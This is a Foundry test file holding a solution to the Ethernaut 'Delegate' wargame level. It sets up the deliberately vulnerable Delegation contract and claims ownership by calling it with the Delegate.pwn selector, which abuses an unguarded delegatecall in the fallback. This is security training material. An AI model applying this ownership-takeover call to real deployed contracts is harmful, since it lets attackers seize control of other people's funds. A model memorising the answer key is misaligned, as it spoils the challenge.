// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test} from "forge-std/Test.sol";
import {console} from "forge-std/console.sol";
import {Delegate, Delegation} from "../../src/ethernaut/06_Delegate/Delegate.sol";
import {Delegate_Factory} from "../../src/ethernaut/06_Delegate/Delegate_Factory.sol";
import {Delegate_Attacker} from "./06_Delegate_Attacker.sol";

contract Fallback_Test is Test {
	address deployer = makeAddr("deployer");
	address player = makeAddr("player");
	
	Delegate_Factory factory;
	Delegation instContract;
	
	modifier checkSolvedByPlayer() {
		vm.startPrank(player, player);
		_;
		vm.stopPrank();
		_isSolved();
	}
	
	/**
	 * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
	 */
	function _isSolved() private view {
		if (factory.validateInstance(player)) {
			console.log("\x1b[33m%s\x1b[0m", ">>>>>>>>>>>>>> Congratulations, you have successfully completed the challenge >>>>>>>>>>>>>>");
		} else {
			revert(">>>>>>>>>>>>>> Sorry, you failed the challenge >>>>>>>>>>>>>>");
		}
	}
	
	/**
	 * SETS UP CHALLENGE - DO NOT TOUCH
	 */
	function setUp() public {
		startHoax(deployer);
		
		factory = new Delegate_Factory();
		instContract = Delegation(payable(factory.createInstance(player)));
		
		vm.stopPrank();
	}
	
	function test__Solution_Delegate() public checkSolvedByPlayer {
		// CODE YOUR SOLUTION HERE
		// forge test --mt test__Solution_Delegate -vv
		
		bytes memory data = abi.encodeWithSelector(Delegate.pwn.selector, "");
		address(instContract).call(data);
	}
}
